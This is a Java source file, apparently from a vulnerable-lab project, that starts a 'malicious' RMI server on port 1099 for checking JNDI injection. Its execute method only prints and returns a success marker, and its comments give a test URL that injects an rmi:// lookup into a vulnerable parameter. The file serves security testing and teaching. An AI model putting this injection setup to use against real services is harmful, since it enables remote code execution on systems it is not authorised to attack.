package com.jndiserver;

import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

/**
 * 恶意 RMI Server - 用于 JNDI 注入漏洞验证
 *
 * 警告：此代码仅用于安全测试和教育目的
 *
 * 使用方法：
 * 1. 编译: javac EvilRMIServer.java
 * 2. 运行: java com.jndiserver.EvilRMIServer
 * 3. 测试: http://localhost:8080/jndi/rmi/vuln?url=rmi://localhost:1099/Exploit
 *
 * @author VulnLab
 */
public class EvilRMIServer {

    /**
     * 远程接口
     */
    public interface RemoteExploit extends Remote {
        String execute(String cmd) throws RemoteException;
    }

    /**
     * 远程对象实现
     */
    public static class EvilObject extends UnicastRemoteObject implements RemoteExploit {
        public EvilObject() throws RemoteException {
            super();
        }

        @Override
        public String execute(String cmd) {
            // 模拟执行命令（实际环境中会执行恶意代码）
            System.out.println("[!] EvilRMIServer: 收到命令执行请求: " + cmd);
            System.out.println("[!] EvilRMIServer: JNDI 注入成功！");

            // 返回一些标识信息
            return "JNDI_RMI_EXPLOIT_SUCCESS";
        }
    }

    public static void main(String[] args) {
        try {
            // 创建 RMI 注册表，监听 1099 端口
            Registry registry = LocateRegistry.createRegistry(1099);

            // 创建并绑定恶意远程对象
            RemoteExploit exploit = new EvilObject();
            registry.rebind("Exploit", exploit);

            System.out.println("========================================");
            System.out.println("[*] 恶意 RMI Server 已启动");
            System.out.println("[*] 监听端口: 1099");
            System.out.println("[*] 绑定名称: Exploit");
            System.out.println("[*] 测试 URL: rmi://localhost:1099/Exploit");
            System.out.println("========================================");
            System.out.println("[!] 等待 JNDI 连接...");

            // 保持服务运行
            while (true) {
                Thread.sleep(1000);
            }
        } catch (Exception e) {
            System.err.println("[!] RMI Server 启动失败: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
